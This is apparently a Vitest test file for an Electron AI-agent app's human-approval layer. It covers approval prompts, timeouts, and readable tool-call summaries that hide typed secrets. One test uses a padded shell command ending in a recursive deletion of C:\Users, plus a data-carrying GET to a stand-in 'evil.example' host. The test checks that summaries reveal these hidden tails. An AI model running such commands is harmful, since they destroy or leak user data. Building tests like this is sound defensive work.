import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import type { BrowserWindow } from 'electron';

vi.mock('electron', () => ({ app: { isPackaged: false } }));

import {
  requestApproval, resolveApproval, cancelAllApprovals, summarizeArgs,
  markApproved, wasApproved, APPROVAL_TIMEOUT_MS,
} from '../src/main/approval';
import { TOOL_META } from '../src/main/tool-meta';

function fakeWin() {
  const send = vi.fn();
  const win = { isDestroyed: () => false, webContents: { send } } as unknown as BrowserWindow;
  return { win, send };
}

const req = { tool: 'shell_exec', summary: 'Run `ls`', actionClass: 'destructive_exec' as const };

/** The id main sent to the renderer in the last `approval-request`. */
function sentId(send: ReturnType<typeof vi.fn>): string {
  const [channel, payload] = send.mock.calls.at(-1)!;
  expect(channel).toBe('approval-request');
  return (payload as { id: string }).id;
}

describe('requestApproval', () => {
  beforeEach(() => { vi.useFakeTimers(); });
  afterEach(() => { cancelAllApprovals(); vi.useRealTimers(); });

  it('resolves approved when the renderer says yes', async () => {
    const { win, send } = fakeWin();
    const p = requestApproval(win, req);
    expect(send).toHaveBeenCalledWith('approval-request', expect.objectContaining({ tool: 'shell_exec', summary: 'Run `ls`', timeoutMs: APPROVAL_TIMEOUT_MS }));
    expect(resolveApproval(sentId(send), true)).toBe(true);
    await expect(p).resolves.toBe('approved');
  });

  it('resolves denied when the renderer says no', async () => {
    const { win, send } = fakeWin();
    const p = requestApproval(win, req);
    expect(resolveApproval(sentId(send), false)).toBe(true);
    await expect(p).resolves.toBe('denied');
  });

  it('times out to "timeout" after APPROVAL_TIMEOUT_MS', async () => {
    const { win } = fakeWin();
    const p = requestApproval(win, req);
    vi.advanceTimersByTime(APPROVAL_TIMEOUT_MS + 1);
    await expect(p).resolves.toBe('timeout');
  });

  it('cancelAllApprovals settles every pending prompt as cancelled', async () => {
    const { win } = fakeWin();
    const a = requestApproval(win, req);
    const b = requestApproval(win, req);
    cancelAllApprovals();
    await expect(a).resolves.toBe('cancelled');
    await expect(b).resolves.toBe('cancelled');
  });

  it('ignores unknown or already-settled ids', async () => {
    const { win, send } = fakeWin();
    const p = requestApproval(win, req);
    expect(resolveApproval('not-a-real-id', true)).toBe(false);
    const id = sentId(send);
    expect(resolveApproval(id, false)).toBe(true);
    expect(resolveApproval(id, true)).toBe(false); // second answer is a no-op
    await expect(p).resolves.toBe('denied');
  });

  it('denies immediately without a window', async () => {
    await expect(requestApproval(null, req)).resolves.toBe('denied');
  });
});

describe('markApproved / wasApproved', () => {
  it('is one-shot per install_skill slug', () => {
    markApproved('install_skill', { slug: 'foo' });
    expect(wasApproved('install_skill', 'foo')).toBe(true);
    expect(wasApproved('install_skill', 'foo')).toBe(false);
    expect(wasApproved('install_skill', 'bar')).toBe(false);
  });
});

describe('summarizeArgs', () => {
  it('produces short human summaries', () => {
    expect(summarizeArgs('kill_process', { name: 'chrome.exe' })).toBe('Kill chrome.exe');
    expect(summarizeArgs('http_request', { method: 'post', url: 'https://api.example.com/path?x=1' })).toBe('POST api.example.com/path, sending 4 chars of data');
    expect(summarizeArgs('http_request', { url: 'https://api.example.com/path' })).toBe('GET api.example.com/path');
    expect(summarizeArgs('write_file', { path: '~/x.txt', content: 'a'.repeat(1234) })).toBe('Write 1,234 chars to ~/x.txt');
    expect(summarizeArgs('outlook_send_email', { to: 'X', subject: 'Y', body: 'secret' })).toBe('Email to X, subject Y');
    expect(summarizeArgs('install_skill', { slug: 'twitter-poster' })).toBe('Install skill twitter-poster');
    expect(summarizeArgs('skill__foo', {})).toBe('Run skill foo');
  });

  it('falls back to plain words for an unknown tool — never JSON, never args', () => {
    const out = summarizeArgs('some_tool', { token: 'abc', text: 'hello' });
    expect(out).toBe('Use some tool');
    expect(out).not.toContain('{');
    expect(out).not.toContain('abc');
    expect(out).not.toContain('hello');
  });

  it('labels every TOOL_META entry in plain English without a brace', () => {
    const sample = {
      text: 'x'.repeat(313), value: 'v', path: 'C:\\Users\\me\\a.txt', url: 'https://example.com', query: 'q', name: 'Notepad',
      target: 'Place order', selector: '#buy', key: 'ctrl+s', x: 10, y: 20, command: 'dir', slug: 'foo', to: 'a@b.c',
      subject: 'Hi', title: 'T', filename: 'f.xlsx', from: 'a', to_path: 'b', input: 'in.zip', output: 'out', field: 'name',
    };
    const TEXT_TOOLS = new Set(['type_text', 'smart_type', 'cdp_type', 'browser_type', 'write_clipboard', 'speak_text', 'replace_focused_text', 'generate_qrcode']);
    const tools = Object.keys(TOOL_META);
    expect(tools.length).toBeGreaterThan(90);
    for (const tool of tools) {
      for (const args of [{}, sample]) {
        const out = summarizeArgs(tool, args);
        expect(out, tool).toBeTruthy();
        expect(out, tool).not.toContain('{');
        expect(out, tool).not.toContain(tool.includes('_') ? tool : '\u0000'); // a label, not the raw tool name
        if (TEXT_TOOLS.has(tool)) expect(out, tool).not.toContain('x'.repeat(41)); // long typed text shows as a length
      }
    }
  });

  it('reads like the user would say it', () => {
    expect(summarizeArgs('type_text', { text: 'x'.repeat(313) })).toBe('Type 313 characters');
    expect(summarizeArgs('type_text', { text: 'see you at noon' })).toBe('Type "see you at noon"');
    expect(summarizeArgs('write_clipboard', { text: 'a'.repeat(50) })).toBe('Copy 50 characters to the clipboard');
    expect(summarizeArgs('smart_click', { target: 'Place order' })).toBe("Click 'Place order'");
    expect(summarizeArgs('open_url', { url: 'https://example.com' })).toBe('Open https://example.com');
    expect(summarizeArgs('key_press', { key: 'ctrl+s' })).toBe('Press ctrl+s');
    expect(summarizeArgs('mouse_click', { x: 5, y: 9, button: 'right' })).toBe('Right-click at (5, 9)');
    expect(summarizeArgs('excel_write', { path: 'C:\\b.xlsx', range: 'A1:B2' })).toBe('Write cells A1:B2 in C:\\b.xlsx');
    expect(summarizeArgs('open_app', { name: 'Notepad' })).toBe('Open Notepad');
  });

  it('never shows text that could be a secret', () => {
    for (const text of ['hunter2', 'Tr0ub4dor&3', 'sunshine', 'my secret pass phrase']) {
      const out = summarizeArgs('smart_type', { target: 'Password', text });
      expect(out).not.toContain(text);
    }
    expect(summarizeArgs('type_text', { text: 'hunter2' })).toBe('Type 7 characters');
    expect(summarizeArgs('cdp_type', { selector: '#otp', text: 'one two three' })).not.toContain('one two');
  });

  it('a governor escalation reads "{reason} — {action}"', () => {
    const reason = "Looks like a purchase button: 'Place order'";
    expect(`${reason} — ${summarizeArgs('smart_click', { target: 'Place order' })}`)
      .toBe("Looks like a purchase button: 'Place order' — Click 'Place order'");
  });

  it('never truncates silently — a hidden tail is called out', () => {
    const cmd = 'echo harmless '.repeat(20) + '&& del /s /q C:\\Users';
    const out = summarizeArgs('shell_exec', { command: cmd });
    expect(out).toContain(`(+${cmd.length - 240} more chars)`);
    expect(summarizeArgs('shell_exec', { command: 'dir' })).toBe('Run `dir`');
    expect(summarizeArgs('http_request', { method: 'GET', url: 'https://evil.example/c?d=' + 'x'.repeat(500) }))
      .toBe('GET evil.example/c, sending 503 chars of data');
  });
});
